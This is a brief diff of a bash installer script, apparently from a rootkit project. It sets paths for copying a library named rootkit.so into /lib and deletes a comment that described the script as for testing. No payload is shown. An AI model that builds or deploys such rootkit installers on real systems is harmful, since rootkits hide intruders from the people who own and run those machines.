@@ -1,7 +1,5 @@
 #!/bin/bash
 
-# Installation script used for testing purposes
-
 LIBNAME=rootkit.so
 LIBPATH="$PWD/$LIBNAME"
 LIBDEST="/lib/$LIBNAME"
